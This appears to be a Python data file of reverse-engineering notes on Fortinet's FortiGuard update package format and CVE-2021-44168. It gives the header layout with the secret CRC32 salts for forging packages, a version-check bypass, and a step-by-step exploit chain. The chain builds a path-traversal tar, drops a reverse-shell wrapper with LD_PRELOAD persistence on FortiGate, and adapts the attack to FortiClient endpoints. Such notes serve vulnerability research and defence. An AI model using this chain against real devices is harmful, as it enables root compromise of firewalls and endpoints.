"""
Fortinet FDS (FortiGuard Distribution System) package format RE + CVE-2021-44168
Sources:
  - cve-pocs/CVE-2021-44168/gen_src-vis_pkg_file.c (PoC generator; complete format)
  - cve-pocs/CVE-2021-44168/pwn.tar (pre-built exploit tar)
  - cve-pocs/CVE-2021-44168/README.md
Products: FortiOS (FortiGate) + FortiClient Linux (update binary)
"""

# ---------------------------------------------------------
# FDS package format (complete, from PoC source)
# ---------------------------------------------------------
FDS_PACKAGE_FORMAT = {
    "id":       "FFDS-FORMAT",
    "product":  "Fortinet FDS (FortiGuard Distribution System) package format",
    "source":   "cve-pocs/CVE-2021-44168/gen_src-vis_pkg_file.c",
    "note":     "Same format used by FortiOS updater AND FortiClient update binary (FCLIENT-UPDATE)",

    "pkg_header": {
        "offset_0x00": "pad0[4] -- padding",
        "offset_0x04": "version[8] -- version string (e.g., '06000004' for 6.0.4; '07000002' for 7.0.2)",
        "offset_0x0c": "num_objects[4] -- number of objects in package",
        "offset_0x10": "size1[4] -- size of payload (compressed data + obj_header)",
        "offset_0x14": "header_len[4] -- sizeof(pkg_header) = 0x40 (64 bytes)",
        "offset_0x18": "unknown1[24] -- reserved/unknown",
        "offset_0x30": "size3[4] -- MUST be 0 (magic; breaks validation if nonzero)",
        "offset_0x34": "size4[4] -- MUST be 0",
        "offset_0x38": "unknown2[4] -- MUST be 0",
        "offset_0x3c": "crc32[4] -- CRC32 of header[0..59] + salt 'B1gS'",
    },

    "obj_header": {
        "offset_0x00": "pkg_type[4] -- 4-char object type code (e.g., 'CIDB', 'AVDB')",
        "offset_0x04": "unknown1[40] -- reserved",
        "offset_0x2c": "flags[4] -- FLAG_SKIP_DATA_CRC32=1 (skip data CRC check)",
        "offset_0x30": "data_len[4] -- length of compressed data",
        "offset_0x34": "header_len[4] -- sizeof(obj_header)",
        "offset_0x38": "magic_null[4] -- MUST be 0",
        "offset_0x3c": "unknown2[60] -- reserved",
        "offset_0x78": "data_crc32[4] -- CRC32 of uncompressed data",
        "offset_0x7c": "header_crc32[4] -- CRC32 of header[0..123] + salt 'H1dN'",
    },

    "crc32_salts": {
        "pkg_header_crc32": "crc32(header[0:60]) + crc32_salt('B1gS')",
        "obj_header_crc32": "crc32(header[0:124]) + crc32_salt('H1dN')",
    },

    "compression": "raw zlib (deflateInit with strategy param, no gzip wrapper); level 9; version '1.2.11' check",

    "version_check_bypass": (
        "pkg_header.version must pass bf_validate_pkg_firmware_version() in FortiOS. "
        "The version check does NOT reject older package versions. "
        "Version string '06000004' (FortiOS 6.0.4) is accepted by FortiOS 7.0.2 and later. "
        "This allows replay of packages crafted for older versions against newer systems."
    ),
}

FDS_OBJECT_TYPES = {
    "id":       "FFDS-OBJTYPES",
    "product":  "Fortinet FDS -- complete object type table (from PoC source)",
    "note":     "Cross-referenced with FortiClient update binary strings (FCLIENT-UPDATE-ARCH)",

    "types": {
        "FCPC": "Command Object",
        "FCPR": "Response Object",
        "AVDB": "Virus Definitions (AV signatures)",
        "NIDS": "Attack Definitions (IPS signatures)",
        "MUDB": "IPS Malicious URL Database",
        "PRXY": "Proxy Executables",
        "AVEN": "Antivirus Engine Executables",
        "FDNI": "FortiResp Network Information (server list; seen in update binary)",
        "FCNI": "FortiCare Network Information",
        "FSCI": "Support Contract Information",
        "FSAE": "Server Authentication Extension",
        "FSSI": "System Support Information",
        "FDSP": "FDS Push Information",
        "FDSI": "FDS System Information",
        "AVST": "Virus Statistics",
        "IMLT": "Image List",
        "FIMG": "Firmware Image",
        "HASY": "HA Sync",
        "STAT": "FortiClient Information",
        "FBVO": "FCP Binary Value Object",
        "FECT": "FortiClient Version List (seen in update binary component FECT)",
        "LIMG": "FortiClient Installer File",
        "FSLP": "SSLVPN Package File",
        "FTSI": "FortiToken Activation",
        "FMDM": "3G/4G Modem List",
        "FAPV": "FortiAP Matrix File",
        "IPGO": "IP Geography Database",
        "CIDB": "Client ID Object (CVE-2021-44168 exploit target type)",
        "FLEN": "FlowAV Engine",
        "FFDB": "FortiFlow Database",
        "UWDB": "URL White List",
        "CRDB": "Certificate Bundle",
        "FLDB": "FlowAV Database",
        "MMDB": "Mobile Malware Database",
        "DBDB": "Botnet Domain Database",
        "FSWV": "FortiSW Matrix File",
        "APDB": "Application Database",
        "ISDB": "Internet Services Database (seen in update binary; delta patching)",
        "IMMX": "Image Upgrade Matrix",
        "MCDB": "Malicious Certificate Database",
        "MIML": "FWF Modem List",
        "MIMG": "FWF Modem Firmware",
        "ALCI": "Account Contract Information",
        "MADB": "MAC Address Database",
        "AFDB": "AntiPhish Pattern Database",
    },
}


# ---------------------------------------------------------
# CVE-2021-44168: FDS package path traversal (FortiOS <= 7.0.2)
# ---------------------------------------------------------
CVE_2021_44168 = {
    "cve":      "CVE-2021-44168",
    "product":  "Fortinet FortiOS <= 7.0.2 -- FDS package CIDB extraction path traversal",
    "cvss":     "7.1 (High) -- local network attacker (update MITM) or admin who can execute CLI",
    "class":    "Path traversal in tar archive extraction; directory traversal via './' prefix (CWE-22)",
    "vector":   "Admin CLI: 'execute restore src-vis tftp <package.img> <server_ip>' OR MITM of FDS update",
    "impact":   "Write arbitrary files to FortiGate filesystem -> LD_PRELOAD persistence -> root shell",
}

CVE_2021_44168_MECHANICS = {
    "path_traversal_mechanism": (
        "FortiGate's CIDB package extraction validates archive paths to prevent directory traversal. "
        "The validator checks for '..' in path components. "
        "Bypass: tar entries created with `tar Pcf file.tar ./../../../../path/to/file`. "
        "The `-P` flag preserves absolute path; `./` prefix creates paths starting with `./`. "
        "FortiGate's validator sees `./../../../../etc/` -- the `./` prefix means: "
        "  - The path starts with a relative reference (`.`) "
        "  - The validator treats it differently from a bare `../../../../etc/` "
        "  - The `./..` combination is not caught by the `..`-only check. "
        "The installed path after extraction resolves `./../../../../etc/` to `/etc/` "
        "relative to the extraction directory, landing outside the intended target."
    ),

    "exploit_chain": (
        "1. Create malicious tar with traversal path: "
        "   tar Pcf pwn.tar ./../../../../data2/bfbin/rdate "
        "   (where rdate is a shell script that wraps busybox and creates a reverse shell). "
        "2. Package the tar using gen_src-vis_pkg_file.c with: "
        "   - pkg_type = 'CIDB' (Client ID Object) "
        "   - version = '06000004' (bypasses version check on FortiOS 7.0.2) "
        "   - CRC32 computed with 'B1gS'/'H1dN' salts. "
        "3. Serve the package via TFTP or MITM the FDS update channel. "
        "4. Trigger extraction: 'execute restore src-vis tftp pwn.img <server>'. "
        "5. FortiGate extracts the tar, landing the shell at /data2/bfbin/rdate. "
        "6. Trigger the shell: 'fnsysctl ls' (or any CLI command that forks to Linux shell). "
        "7. LD_PRELOAD mechanism loads the dropped shell, giving root shell access."
    ),

    "ld_preload_persistence": (
        "/data2/bfbin/ is a directory in the FortiGate PATH used for CLI execution. "
        "Replacing or augmenting binaries in this path with shell wrappers that set LD_PRELOAD "
        "causes the shell to load whenever the binary is executed. "
        "The dropped shell is persistent across reboots if /data2/ is on persistent storage. "
        "FortiGate's integrity checking does not cover /data2/bfbin/ contents "
        "(verified: no mention of /data2/bfbin/ in FortiOS firmware integrity documentation)."
    ),

    "mitm_vector": (
        "FortiOS checks for FDS server certificate but uses the FDS network address from "
        "the FDNI package (FortiResp Net Info). "
        "An attacker who can MITM DNS for the FDS server hostnames OR inject into the FDNI package "
        "can redirect FortiGate to an attacker-controlled FDS server. "
        "The attacker's FDS server serves a malicious CIDB package. "
        "FortiGate downloads and extracts it without additional verification. "
        "Note: the pkg_header CRC32 with 'B1gS' salt is now known -- the attacker can generate "
        "valid CRC32 values for any crafted package."
    ),

    "forticlient_update_parallel": (
        "The FortiClient Linux update binary (FCLIENT-UPDATE) uses the SAME FDS package format. "
        "The CIDB, ISDB, FDNI, FECT object types are all visible in the update binary strings. "
        "CVE-2021-44168 against FortiClient: "
        "  1. MITM the FortiClient update channel (FDNI server list injection; FCLIENT-UPDATE-F02). "
        "  2. Serve malicious CIDB/AVDB/ISDB package with path traversal in the tar. "
        "  3. FortiClient update binary extracts the tar to an installation directory. "
        "  4. Path traversal lands file at arbitrary path on the endpoint. "
        "  5. Dropped file could be: cron job, systemd service, LD_PRELOAD library, sudo entry. "
        "FortiClient was also patched for CVE-2021-44168 but the path traversal mechanism "
        "is identical since both products share the FDS update protocol."
    ),
}

CVE_2021_44168_VERSION = {
    "version_string_map": {
        "06000004": "FortiOS 6.0.4 (PoC uses this; accepted by 7.0.2)",
        "06000200": "FortiOS 6.2.0",
        "07000002": "FortiOS 7.0.2 (explicit in PoC comment)",
    },

    "note": (
        "The version check in bf_validate_pkg_firmware_version() (address 0x01564090 in 7.0.2 VM) "
        "does not reject packages with older version strings. "
        "This means a package crafted for FortiOS 6.0.4 can be installed on FortiOS 7.0.2. "
        "The version field is 8 ASCII bytes representing a decimal version number: "
        "  06000004 = major.minor.patch = 6.00.04 = FortiOS 6.0.4"
    ),
}
